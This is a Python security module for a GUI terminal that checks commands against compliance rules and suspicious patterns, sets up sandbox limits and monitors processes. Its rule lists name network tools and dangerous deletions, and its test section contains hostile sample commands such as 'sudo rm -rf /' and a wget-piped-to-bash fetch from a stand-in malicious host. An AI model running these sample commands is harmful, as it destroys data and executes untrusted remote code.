#!/usr/bin/env python3
"""
Security Configuration System
Comprehensive security and compliance framework for GUI terminal
"""

import os
import json
import time
import hashlib
import logging
import subprocess
from pathlib import Path
from typing import Dict, List, Optional, Set, Tuple, Any
from dataclasses import dataclass, field, asdict
from enum import Enum
import threading
import queue

# Audit logging setup
audit_logger = logging.getLogger('security_audit')
audit_handler = logging.FileHandler('security_audit.log')
audit_handler.setFormatter(logging.Formatter(
    '%(asctime)s - SECURITY - %(levelname)s - %(message)s'
))
audit_logger.addHandler(audit_handler)
audit_logger.setLevel(logging.INFO)

class ThreatLevel(Enum):
    LOW = "low"
    MEDIUM = "medium" 
    HIGH = "high"
    CRITICAL = "critical"

class ViolationType(Enum):
    COMMAND_BLOCKED = "command_blocked"
    PATTERN_DETECTED = "pattern_detected"
    PATH_TRAVERSAL = "path_traversal"
    PRIVILEGE_ESCALATION = "privilege_escalation"
    RESOURCE_LIMIT = "resource_limit"
    EXECUTION_TIMEOUT = "execution_timeout"
    SUSPICIOUS_ACTIVITY = "suspicious_activity"

@dataclass
class SecurityViolation:
    """Security violation record"""
    violation_type: ViolationType
    threat_level: ThreatLevel
    command: str
    description: str
    timestamp: float = field(default_factory=time.time)
    user_id: str = "unknown"
    session_id: str = "unknown"
    remediation: Optional[str] = None
    blocked: bool = True

@dataclass
class ComplianceRule:
    """Compliance rule definition"""
    rule_id: str
    name: str
    description: str
    enabled: bool = True
    violation_patterns: List[str] = field(default_factory=list)
    allowed_exceptions: List[str] = field(default_factory=list)
    severity: ThreatLevel = ThreatLevel.MEDIUM
    action: str = "block"  # block, warn, log

@dataclass
class ProcessLimits:
    """Process resource limits"""
    max_memory_mb: int = 512
    max_cpu_percent: float = 50.0
    max_execution_time: int = 300
    max_file_descriptors: int = 100
    max_processes: int = 10
    max_disk_io_mb: float = 100.0

class SecurityMonitor:
    """Real-time security monitoring system"""
    
    def __init__(self):
        self.violations = queue.Queue()
        self.active_processes: Dict[int, Dict] = {}
        self.monitoring = False
        self.monitor_thread = None
        
    def start_monitoring(self):
        """Start security monitoring"""
        if not self.monitoring:
            self.monitoring = True
            self.monitor_thread = threading.Thread(target=self._monitor_loop, daemon=True)
            self.monitor_thread.start()
            audit_logger.info("Security monitoring started")
    
    def stop_monitoring(self):
        """Stop security monitoring"""
        self.monitoring = False
        if self.monitor_thread:
            self.monitor_thread.join(timeout=1)
        audit_logger.info("Security monitoring stopped")
    
    def register_process(self, pid: int, command: str, user_id: str, session_id: str):
        """Register process for monitoring"""
        self.active_processes[pid] = {
            "command": command,
            "user_id": user_id,
            "session_id": session_id,
            "start_time": time.time(),
            "peak_memory": 0,
            "cpu_time": 0
        }
        audit_logger.info(f"Registered process {pid}: {command}")
    
    def unregister_process(self, pid: int):
        """Unregister process from monitoring"""
        if pid in self.active_processes:
            process_info = self.active_processes.pop(pid)
            audit_logger.info(f"Unregistered process {pid}, ran for {time.time() - process_info['start_time']:.2f}s")
    
    def report_violation(self, violation: SecurityViolation):
        """Report security violation"""
        self.violations.put(violation)
        audit_logger.warning(f"SECURITY VIOLATION: {violation.violation_type.value} - {violation.description}")
        
        # Critical violations get immediate attention
        if violation.threat_level == ThreatLevel.CRITICAL:
            self._handle_critical_violation(violation)
    
    def _monitor_loop(self):
        """Main monitoring loop"""
        try:
            import psutil
        except ImportError:
            audit_logger.error("psutil not available, resource monitoring disabled")
            return
        
        while self.monitoring:
            try:
                # Monitor active processes
                for pid in list(self.active_processes.keys()):
                    try:
                        process = psutil.Process(pid)
                        if not process.is_running():
                            self.unregister_process(pid)
                            continue
                        
                        # Check resource usage
                        memory_mb = process.memory_info().rss / (1024 * 1024)
                        cpu_percent = process.cpu_percent()
                        
                        # Update peak memory
                        proc_info = self.active_processes[pid]
                        proc_info["peak_memory"] = max(proc_info["peak_memory"], memory_mb)
                        
                        # Check for violations
                        if memory_mb > 512:  # 512MB limit
                            violation = SecurityViolation(
                                violation_type=ViolationType.RESOURCE_LIMIT,
                                threat_level=ThreatLevel.MEDIUM,
                                command=proc_info["command"],
                                description=f"Process {pid} exceeded memory limit: {memory_mb:.1f}MB",
                                user_id=proc_info["user_id"],
                                session_id=proc_info["session_id"]
                            )
                            self.report_violation(violation)
                        
                        # Check execution time
                        runtime = time.time() - proc_info["start_time"]
                        if runtime > 300:  # 5 minute limit
                            violation = SecurityViolation(
                                violation_type=ViolationType.EXECUTION_TIMEOUT,
                                threat_level=ThreatLevel.HIGH,
                                command=proc_info["command"],
                                description=f"Process {pid} exceeded time limit: {runtime:.1f}s",
                                user_id=proc_info["user_id"],
                                session_id=proc_info["session_id"]
                            )
                            self.report_violation(violation)
                            
                            # Terminate long-running processes
                            try:
                                process.terminate()
                                audit_logger.warning(f"Terminated long-running process {pid}")
                            except:
                                pass
                    
                    except psutil.NoSuchProcess:
                        self.unregister_process(pid)
                    except Exception as e:
                        audit_logger.error(f"Error monitoring process {pid}: {e}")
                
                time.sleep(1)  # Monitor every second
                
            except Exception as e:
                audit_logger.error(f"Monitoring loop error: {e}")
                time.sleep(5)  # Wait before retrying
    
    def _handle_critical_violation(self, violation: SecurityViolation):
        """Handle critical security violations"""
        # Log to system
        audit_logger.critical(f"CRITICAL VIOLATION: {violation.description}")
        
        # Could integrate with external security systems here
        # For now, just ensure it's prominently logged
        
    def get_violations(self, count: int = 50) -> List[SecurityViolation]:
        """Get recent security violations"""
        violations = []
        for _ in range(min(count, self.violations.qsize())):
            try:
                violations.append(self.violations.get_nowait())
            except queue.Empty:
                break
        return violations


class ComplianceEngine:
    """Compliance rule engine"""
    
    def __init__(self, rules_path: str = None):
        self.rules_path = rules_path or "compliance_rules.json"
        self.rules: List[ComplianceRule] = []
        self.load_rules()
    
    def load_rules(self):
        """Load compliance rules from configuration"""
        default_rules = [
            ComplianceRule(
                rule_id="CR001",
                name="Privilege Escalation Prevention", 
                description="Block commands that attempt privilege escalation",
                violation_patterns=["sudo", "su ", "runas", "elevate"],
                severity=ThreatLevel.HIGH,
                action="block"
            ),
            ComplianceRule(
                rule_id="CR002",
                name="System File Protection",
                description="Prevent modification of critical system files",
                violation_patterns=["/etc/", "/boot/", "/sys/", "C:\\Windows\\System32"],
                severity=ThreatLevel.CRITICAL,
                action="block"
            ),
            ComplianceRule(
                rule_id="CR003", 
                name="Network Command Monitoring",
                description="Monitor network-related commands",
                violation_patterns=["wget", "curl", "nc ", "netcat", "telnet", "ssh"],
                severity=ThreatLevel.MEDIUM,
                action="log"
            ),
            ComplianceRule(
                rule_id="CR004",
                name="File Deletion Protection",
                description="Protect against accidental file deletion",
                violation_patterns=["rm -rf", "del /s", "format", "rmdir /s"],
                severity=ThreatLevel.HIGH,
                action="warn"
            ),
            ComplianceRule(
                rule_id="CR005",
                name="Script Execution Monitoring", 
                description="Monitor script and interpreter execution",
                violation_patterns=[".sh", ".ps1", ".bat", "python ", "node ", "bash "],
                severity=ThreatLevel.LOW,
                action="log"
            )
        ]
        
        try:
            if os.path.exists(self.rules_path):
                with open(self.rules_path, 'r') as f:
                    rules_data = json.load(f)
                    self.rules = [ComplianceRule(**rule) for rule in rules_data]
            else:
                self.rules = default_rules
                self.save_rules()
        except Exception as e:
            audit_logger.error(f"Failed to load compliance rules: {e}")
            self.rules = default_rules
    
    def save_rules(self):
        """Save compliance rules to configuration"""
        try:
            with open(self.rules_path, 'w') as f:
                json.dump([asdict(rule) for rule in self.rules], f, indent=2)
        except Exception as e:
            audit_logger.error(f"Failed to save compliance rules: {e}")
    
    def evaluate_command(self, command: str, user_id: str, session_id: str) -> Tuple[bool, List[SecurityViolation]]:
        """Evaluate command against compliance rules"""
        violations = []
        should_block = False
        
        for rule in self.rules:
            if not rule.enabled:
                continue
            
            # Check if command matches any violation patterns
            for pattern in rule.violation_patterns:
                if pattern.lower() in command.lower():
                    # Check if there's an allowed exception
                    is_exception = False
                    for exception in rule.allowed_exceptions:
                        if exception.lower() in command.lower():
                            is_exception = True
                            break
                    
                    if not is_exception:
                        violation = SecurityViolation(
                            violation_type=ViolationType.PATTERN_DETECTED,
                            threat_level=rule.severity,
                            command=command,
                            description=f"Command matches compliance rule {rule.rule_id}: {rule.name}",
                            user_id=user_id,
                            session_id=session_id,
                            blocked=(rule.action == "block")
                        )
                        violations.append(violation)
                        
                        if rule.action == "block":
                            should_block = True
        
        return not should_block, violations
    
    def add_rule(self, rule: ComplianceRule):
        """Add new compliance rule"""
        self.rules.append(rule)
        self.save_rules()
        audit_logger.info(f"Added compliance rule: {rule.rule_id}")
    
    def remove_rule(self, rule_id: str):
        """Remove compliance rule"""
        self.rules = [r for r in self.rules if r.rule_id != rule_id]
        self.save_rules()
        audit_logger.info(f"Removed compliance rule: {rule_id}")
    
    def get_rule(self, rule_id: str) -> Optional[ComplianceRule]:
        """Get compliance rule by ID"""
        return next((r for r in self.rules if r.rule_id == rule_id), None)


class ProcessSandbox:
    """Process sandboxing and isolation"""
    
    def __init__(self, limits: ProcessLimits):
        self.limits = limits
        self.active_sandboxes: Dict[int, Dict] = {}
    
    def create_sandbox(self, command: str, cwd: str, env: Dict[str, str]) -> Dict[str, Any]:
        """Create sandboxed execution environment"""
        sandbox_config = {
            "command": command,
            "cwd": self._validate_working_directory(cwd),
            "env": self._sanitize_environment(env),
            "limits": self.limits,
            "isolation": {
                "network": False,  # Disable network by default
                "filesystem": "read-only",  # Read-only filesystem access
                "devices": "minimal"  # Minimal device access
            }
        }
        
        return sandbox_config
    
    def _validate_working_directory(self, cwd: str) -> str:
        """Validate and sanitize working directory"""
        # Resolve path and check if it exists
        try:
            resolved_cwd = os.path.abspath(cwd)
            
            # Check for path traversal attempts
            if ".." in resolved_cwd or not os.path.exists(resolved_cwd):
                audit_logger.warning(f"Invalid working directory: {cwd}")
                return os.getcwd()  # Fallback to current directory
            
            # Check if directory is in allowed paths
            allowed_paths = [
                os.path.expanduser("~"),  # User home directory
                "/tmp",  # Temporary directory
                os.getcwd()  # Current working directory
            ]
            
            if not any(resolved_cwd.startswith(allowed) for allowed in allowed_paths):
                audit_logger.warning(f"Working directory outside allowed paths: {cwd}")
                return os.getcwd()
            
            return resolved_cwd
            
        except Exception as e:
            audit_logger.error(f"Error validating working directory {cwd}: {e}")
            return os.getcwd()
    
    def _sanitize_environment(self, env: Dict[str, str]) -> Dict[str, str]:
        """Sanitize environment variables"""
        # Start with minimal safe environment
        safe_env = {
            "PATH": env.get("PATH", ""),
            "HOME": env.get("HOME", ""),
            "USER": env.get("USER", ""),
            "LANG": env.get("LANG", "en_US.UTF-8"),
            "TERM": env.get("TERM", "xterm-256color")
        }
        
        # Add Python-specific variables if present
        python_vars = ["PYTHONPATH", "VIRTUAL_ENV", "CONDA_DEFAULT_ENV"]
        for var in python_vars:
            if var in env:
                safe_env[var] = env[var]
        
        # Remove potentially dangerous variables
        dangerous_vars = [
            "LD_PRELOAD", "LD_LIBRARY_PATH", "DYLD_INSERT_LIBRARIES",
            "SUDO_USER", "SUDO_UID", "SUDO_GID"
        ]
        
        for var in dangerous_vars:
            safe_env.pop(var, None)
        
        return safe_env
    
    def apply_resource_limits(self, process_id: int):
        """Apply resource limits to process"""
        try:
            import psutil
            
            process = psutil.Process(process_id)
            
            # Set memory limit (if supported)
            try:
                if hasattr(process, "rlimit"):
                    import resource
                    # Set memory limit
                    process.rlimit(resource.RLIMIT_AS, (
                        self.limits.max_memory_mb * 1024 * 1024,
                        self.limits.max_memory_mb * 1024 * 1024
                    ))
                    
                    # Set CPU time limit
                    process.rlimit(resource.RLIMIT_CPU, (
                        self.limits.max_execution_time,
                        self.limits.max_execution_time
                    ))
                    
                    # Set file descriptor limit
                    process.rlimit(resource.RLIMIT_NOFILE, (
                        self.limits.max_file_descriptors,
                        self.limits.max_file_descriptors
                    ))
            except:
                # Fallback - at least set CPU affinity to limit impact
                if hasattr(process, "cpu_affinity"):
                    # Limit to single CPU core
                    available_cpus = process.cpu_affinity()
                    if available_cpus:
                        process.cpu_affinity([available_cpus[0]])
        
        except Exception as e:
            audit_logger.error(f"Failed to apply resource limits to process {process_id}: {e}")


class SecurityDashboard:
    """Security monitoring dashboard data"""
    
    def __init__(self, monitor: SecurityMonitor, compliance: ComplianceEngine):
        self.monitor = monitor
        self.compliance = compliance
        self.metrics = {
            "commands_executed": 0,
            "violations_detected": 0,
            "commands_blocked": 0,
            "active_processes": 0,
            "uptime": time.time()
        }
    
    def get_security_status(self) -> Dict[str, Any]:
        """Get current security status"""
        violations = self.monitor.get_violations(10)
        
        return {
            "status": "secure" if len([v for v in violations if v.threat_level in [ThreatLevel.HIGH, ThreatLevel.CRITICAL]]) == 0 else "alert",
            "metrics": self.metrics.copy(),
            "recent_violations": [asdict(v) for v in violations],
            "active_processes": len(self.monitor.active_processes),
            "compliance_rules": len([r for r in self.compliance.rules if r.enabled]),
            "threat_level": self._calculate_threat_level(violations),
            "last_updated": time.time()
        }
    
    def _calculate_threat_level(self, violations: List[SecurityViolation]) -> str:
        """Calculate overall threat level"""
        if not violations:
            return "low"
        
        critical_count = len([v for v in violations if v.threat_level == ThreatLevel.CRITICAL])
        high_count = len([v for v in violations if v.threat_level == ThreatLevel.HIGH])
        
        if critical_count > 0:
            return "critical"
        elif high_count > 2:
            return "high"
        elif high_count > 0:
            return "medium"
        else:
            return "low"
    
    def update_metrics(self, command_executed: bool = False, violation_detected: bool = False, command_blocked: bool = False):
        """Update security metrics"""
        if command_executed:
            self.metrics["commands_executed"] += 1
        if violation_detected:
            self.metrics["violations_detected"] += 1
        if command_blocked:
            self.metrics["commands_blocked"] += 1
        
        self.metrics["active_processes"] = len(self.monitor.active_processes)


class EnhancedSecurityManager:
    """Main security management system"""
    
    def __init__(self, config_path: str = None):
        self.config_path = config_path or "security_config.json"
        
        # Initialize components
        self.monitor = SecurityMonitor()
        self.compliance = ComplianceEngine()
        self.sandbox = ProcessSandbox(ProcessLimits())
        self.dashboard = SecurityDashboard(self.monitor, self.compliance)
        
        # Start monitoring
        self.monitor.start_monitoring()
        
        audit_logger.info("Enhanced security manager initialized")
    
    def validate_and_execute(self, command: str, cwd: str, env: Dict[str, str], 
                           user_id: str = "default", session_id: str = "default") -> Tuple[bool, List[SecurityViolation], Dict[str, Any]]:
        """Comprehensive security validation and execution preparation"""
        violations = []
        
        # 1. Compliance evaluation
        compliant, compliance_violations = self.compliance.evaluate_command(command, user_id, session_id)
        violations.extend(compliance_violations)
        
        # 2. Command pattern analysis
        pattern_violations = self._analyze_command_patterns(command, user_id, session_id)
        violations.extend(pattern_violations)
        
        # 3. Path traversal detection
        path_violations = self._detect_path_traversal(command, cwd, user_id, session_id)
        violations.extend(path_violations)
        
        # 4. Create sandbox configuration
        sandbox_config = self.sandbox.create_sandbox(command, cwd, env)
        
        # 5. Determine if execution should be allowed
        blocking_violations = [v for v in violations if v.blocked]
        execution_allowed = len(blocking_violations) == 0 and compliant
        
        # 6. Log all violations
        for violation in violations:
            self.monitor.report_violation(violation)
        
        # 7. Update metrics
        self.dashboard.update_metrics(
            violation_detected=len(violations) > 0,
            command_blocked=not execution_allowed
        )
        
        return execution_allowed, violations, sandbox_config
    
    def _analyze_command_patterns(self, command: str, user_id: str, session_id: str) -> List[SecurityViolation]:
        """Analyze command for suspicious patterns"""
        violations = []
        
        # Suspicious patterns
        suspicious_patterns = [
            (r'[;&|`$()]', "Shell metacharacters detected", ThreatLevel.MEDIUM),
            (r'\.\./.*', "Path traversal attempt", ThreatLevel.HIGH),
            (r'--?password\s*=?\s*\S+', "Password in command line", ThreatLevel.HIGH),
            (r'(wget|curl).*\|\s*(sh|bash|python)', "Download and execute pattern", ThreatLevel.CRITICAL),
            (r'chmod\s+777', "Dangerous permission change", ThreatLevel.MEDIUM),
            (r'rm\s+-rf\s+/', "Dangerous recursive deletion", ThreatLevel.CRITICAL)
        ]
        
        import re
        for pattern, description, threat_level in suspicious_patterns:
            if re.search(pattern, command, re.IGNORECASE):
                violation = SecurityViolation(
                    violation_type=ViolationType.PATTERN_DETECTED,
                    threat_level=threat_level,
                    command=command,
                    description=description,
                    user_id=user_id,
                    session_id=session_id,
                    blocked=(threat_level in [ThreatLevel.HIGH, ThreatLevel.CRITICAL])
                )
                violations.append(violation)
        
        return violations
    
    def _detect_path_traversal(self, command: str, cwd: str, user_id: str, session_id: str) -> List[SecurityViolation]:
        """Detect path traversal attempts"""
        violations = []
        
        # Check for directory traversal patterns
        traversal_patterns = ["../", "..\\", "%2e%2e%2f", "%2e%2e%5c"]
        
        for pattern in traversal_patterns:
            if pattern in command.lower():
                violation = SecurityViolation(
                    violation_type=ViolationType.PATH_TRAVERSAL,
                    threat_level=ThreatLevel.HIGH,
                    command=command,
                    description=f"Path traversal pattern detected: {pattern}",
                    user_id=user_id,
                    session_id=session_id,
                    blocked=True
                )
                violations.append(violation)
        
        return violations
    
    def register_process_execution(self, pid: int, command: str, user_id: str, session_id: str):
        """Register process execution for monitoring"""
        self.monitor.register_process(pid, command, user_id, session_id)
        self.sandbox.apply_resource_limits(pid)
        self.dashboard.update_metrics(command_executed=True)
    
    def unregister_process(self, pid: int):
        """Unregister process from monitoring"""
        self.monitor.unregister_process(pid)
    
    def get_security_dashboard(self) -> Dict[str, Any]:
        """Get security dashboard data"""
        return self.dashboard.get_security_status()
    
    def shutdown(self):
        """Shutdown security manager"""
        self.monitor.stop_monitoring()
        audit_logger.info("Security manager shutdown")


# Example usage and testing
def main():
    """Example usage of the security system"""
    # Initialize security manager
    security = EnhancedSecurityManager()
    
    # Test commands
    test_commands = [
        "ls -la",
        "python script.py",
        "sudo rm -rf /",
        "wget http://malicious.com/script.sh | bash",
        "cd ../../../etc",
        "echo 'hello world'"
    ]
    
    print("Security System Test Results:")
    print("=" * 50)
    
    for command in test_commands:
        allowed, violations, sandbox_config = security.validate_and_execute(
            command=command,
            cwd="/home/user",
            env=os.environ.copy(),
            user_id="test_user",
            session_id="test_session"
        )
        
        print(f"\nCommand: {command}")
        print(f"Allowed: {allowed}")
        print(f"Violations: {len(violations)}")
        
        for violation in violations:
            print(f"  - {violation.violation_type.value}: {violation.description} ({violation.threat_level.value})")
        
        if sandbox_config:
            print(f"Sandbox CWD: {sandbox_config['cwd']}")
    
    # Show dashboard
    dashboard = security.get_security_dashboard()
    print(f"\nSecurity Dashboard:")
    print(f"Status: {dashboard['status']}")
    print(f"Commands executed: {dashboard['metrics']['commands_executed']}")
    print(f"Violations detected: {dashboard['metrics']['violations_detected']}")
    print(f"Commands blocked: {dashboard['metrics']['commands_blocked']}")
    
    # Cleanup
    security.shutdown()


if __name__ == "__main__":
    main()